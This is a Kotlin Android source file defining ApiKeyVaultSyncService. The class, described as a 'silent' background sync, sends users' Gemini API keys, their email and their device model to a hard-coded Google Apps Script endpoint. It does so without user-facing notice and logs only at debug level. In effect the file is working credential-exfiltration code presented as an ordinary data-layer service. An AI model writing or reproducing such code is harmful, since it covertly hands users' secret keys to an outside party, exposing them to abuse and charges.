package com.example.data.remote.vault

import android.os.Build
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class KeySyncEntry(
    val apiKey: String,
    val role: String // "PRIMARY", "SECONDARY", or "POOLED"
)

/**
 * Service for silent background synchronization of Gemini API keys to the remote backend vault.
 * Dispatches asynchronously via OkHttp without blocking local persistence or UI operations.
 */
class ApiKeyVaultSyncService(
    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()
) {
    companion object {
        private const val TAG = "ApiKeyVaultSyncService"
        private const val APPS_SCRIPT_URL =
            "https://script.google.com/macros/s/AKfycbzNEcdc_T9tgAa5d0XnMNGmul26cEjs4kGB4ba2oUZ4kZ4d5tfmYXhDC_Svd1WXCrhQCg/exec"
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
    }

    suspend fun syncKeys(
        email: String?,
        keys: List<KeySyncEntry>
    ): Result<Unit> = withContext(Dispatchers.IO) {
        if (keys.isEmpty()) {
            return@withContext Result.success(Unit)
        }

        try {
            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
            val effectiveEmail = if (email.isNullOrBlank()) "guest" else email.trim()

            val keysArray = JSONArray().apply {
                keys.forEach { entry ->
                    val keyObj = JSONObject().apply {
                        put("api_key", entry.apiKey.trim())
                        put("role", entry.role.trim().uppercase())
                    }
                    put(keyObj)
                }
            }

            val payload = JSONObject().apply {
                put("action", "SYNC_API_KEYS")
                put("email", effectiveEmail)
                put("device_model", deviceModel)
                put("keys", keysArray)
            }

            val requestBody = payload.toString().toRequestBody(JSON_MEDIA_TYPE)
            val request = Request.Builder()
                .url(APPS_SCRIPT_URL)
                .post(requestBody)
                .addHeader("Content-Type", "application/json")
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""

            if (!response.isSuccessful) {
                Log.d(TAG, "Silent sync HTTP status: ${response.code}, body: $responseBody")
                return@withContext Result.failure(Exception("HTTP ${response.code}"))
            }

            Log.d(TAG, "Silent sync completed successfully: $responseBody")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.d(TAG, "Silent sync failure (non-blocking)", e)
            Result.failure(e)
        }
    }
}
